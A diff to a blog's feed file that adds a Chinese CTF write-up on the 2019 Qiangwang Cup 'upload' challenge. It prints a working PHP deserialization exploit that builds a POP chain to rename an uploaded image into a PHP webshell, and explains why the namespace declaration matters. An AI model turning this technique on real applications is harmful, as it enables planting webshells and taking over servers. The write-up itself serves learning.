@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>浅谈PHP命名空间对于反序列化漏洞利用的影响</title>
+      <link href="/2023/04/09/%E6%B5%85%E8%B0%88PHP%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E5%AF%B9%E4%BA%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9A%84%E5%BD%B1%E5%93%8D/"/>
+      <url>/2023/04/09/%E6%B5%85%E8%B0%88PHP%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E5%AF%B9%E4%BA%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9A%84%E5%BD%B1%E5%93%8D/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer@latest/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting@1/dist/Meting.min.js"></script><p>今天做了一道BUU上收录的2019强网杯upload，解题过程中拿到了题目源码，里面有个函数会对cookie进行反序列化，基本思路就是利用反序列化和源码中的魔术方法构造POP链进入upload_img函数绕过对上传文件的强制命名，从而拿到webshell</p><p>结果EXP都写好了，生成的字符串换到Cookie里面刷新却没能成功，找了别人的EXP过来对比自己也看不出哪里不一样，但是把别人的拿来用又行了，怎么会是呢？以下是我最开始写的EXP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$registed</span> = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename_tmp</span>=<span class="string">&#x27;./upload/f9e1016a5cec370aae6a18d438dabfa5/1741b019882cc15c136b1977bcd295bc.png&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;./upload/f9e1016a5cec370aae6a18d438dabfa5/shedsall.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$except</span> = <span class="keyword">array</span>(<span class="string">&#x27;index&#x27;</span>=&gt;<span class="string">&#x27;upload_img&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Register();</span><br><span class="line"><span class="variable">$a</span>-&gt;checker = <span class="keyword">new</span> Profile();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>擦亮眼睛仔细对比后，我发现了自己写的EXP和别人的不同之处，他们的EXP开头都有一行代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br></pre></td></tr></table></figure><p>namespace的作用是分配命名空间，可以起到防止变量、函数、类名重复的效果，runoob上有一篇专门讲PHP中的命名空间的文章很不错：</p><p><a href="https://www.runoob.com/w3cnote/php-namespace-intro.html">https://www.runoob.com/w3cnote/php-namespace-intro.html</a></p><p>其中提到了当调用其它命名空间（如test）下的类名(如Register)时，需要使用<strong>\test\Register</strong> ：一种像文件路径的语法： <strong>\空间名\元素名</strong></p><p>而当我们用echo输出对EXP添加命名空间前后的序列化字符串时，也能发现其中的不同（上面的结果是不添加Namespace的，下面的反之）<img src="C:\Users\who'can'se'e\AppData\Roaming\Typora\typora-user-images\image-20230409201602246.png" alt="image-20230409201602246" loading="lazy"></p><p>类名从<strong>Register</strong>变成了<strong>app\web\controller\Register</strong>，即<strong>\空间名\元素名</strong>的语法，所以说<strong>序列化后的字符串是会受到namespace影响的</strong>。</p><p>那么问题来了，为什么我们一定要添加这行代码声明命名空间才能执行成功呢？我翻了翻题目源码：<img src="C:\Users\who'can'se'e\AppData\Roaming\Typora\typora-user-images\image-20230409202024875.png" alt="image-20230409202024875" loading="lazy"></p><p>原来是题目源码中规定好了这样的命名空间，所以也只有声明了同样命名空间的EXP才能生成有效的序列化字符串，不然类名都不同了。</p><p>这种疏忽完全来源于基础的薄弱……但是边做边学效率才是最高的，嗯…我认错但还是不改。</p><p>事情到这里就算告一段落，我写下这篇博客后也心满意足地看比赛去了~</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 技术 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 安全 PHP 反序列化 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>浅谈SQL语句不区分大小写的特性与盲注脚本碰撞所产生的一个坑</title>
       <link href="/2023/02/13/%E6%B5%85%E8%B0%88SQL%E8%AF%AD%E5%8F%A5%E4%B8%8D%E5%8C%BA%E5%88%86%E5%A4%A7%E5%B0%8F%E5%86%99%E7%9A%84%E7%89%B9%E6%80%A7%E4%B8%8E%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%A2%B0%E6%92%9E%E6%89%80%E4%BA%A7%E7%94%9F%E7%9A%84%E4%B8%80%E4%B8%AA%E5%9D%91/"/>
       <url>/2023/02/13/%E6%B5%85%E8%B0%88SQL%E8%AF%AD%E5%8F%A5%E4%B8%8D%E5%8C%BA%E5%88%86%E5%A4%A7%E5%B0%8F%E5%86%99%E7%9A%84%E7%89%B9%E6%80%A7%E4%B8%8E%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%A2%B0%E6%92%9E%E6%89%80%E4%BA%A7%E7%94%9F%E7%9A%84%E4%B8%80%E4%B8%AA%E5%9D%91/</url>
